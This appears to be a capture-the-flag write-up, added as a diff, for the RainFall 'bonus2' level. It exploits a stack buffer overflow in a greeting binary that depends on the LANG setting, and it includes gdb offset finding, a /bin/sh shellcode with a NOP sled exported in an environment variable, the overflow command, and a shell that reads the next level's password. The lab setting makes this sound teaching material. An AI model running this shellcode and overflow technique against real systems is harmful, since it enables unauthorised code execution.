@@ -1,0 +1,45 @@
+# Bonus
+
+## Analysis
+
+## Attack type: Buffer overflow
+
+We found a binary when decompiled that checks for langages and then concatenate a greeting string with the argv input.
+
+We discovered that the binary is vulnerable to a buffer overflow attack by trying to make it segfaults on big inputs.
+
+We then sent a big input with a pattern and found the offset to the return address.
+
+Once we found the offset of the EIP we know we can inject a shellcode and jump to it.
+
+The small problem is that we cannot send directly our shellcode from the input because the offset is too close to the start of the input.
+(we need 28bytes for the offset + 4 bytes for the EIP)
+
+```bash
+(gdb) r AJHSGDJASGDHJASJDGSAHJGDsaDHGJHGJHASGDJHASGJHDASHGDSAJHGDSAHGASHJDGHSJA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+Starting program: /home/user/bonus2/bonus2 AJHSGDJASGDHJASJDGSAHJGDsaDHGJHGJHASGDJHASGJHDASHGDSAJHGDSAHGASHJDGHSJA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+Hyvää päivää AJHSGDJASGDHJASJDGSAHJGDsaDHGJHGJHASGDJHAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+```
+`0x41366141` is the offset of the EIP. -> 18 for the LANG=fi and 23 for the LANG=nl
+
+So we set our shellcode in the environment variable:
+```bash
+bonus2@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90"*8000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+```
+then we set our LANG variable and we get the address of the `SHELLCODE` in the environment.
+The good thing is that `ASLR` is not activated on this system. so the address will not change.
+
+
+*Tadaaaaaaaa*:
+```bash
+bonus2@RainFall:~$ export LANG=nl
+bonus2@RainFall:~$ /tmp/find_env_addr2
+0xbfffd9ad
+bonus2@RainFall:~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $(python -c 'print 23*"A" + "\xad\xd9\xff\xbf" + 34 * "\x90"')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���������
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
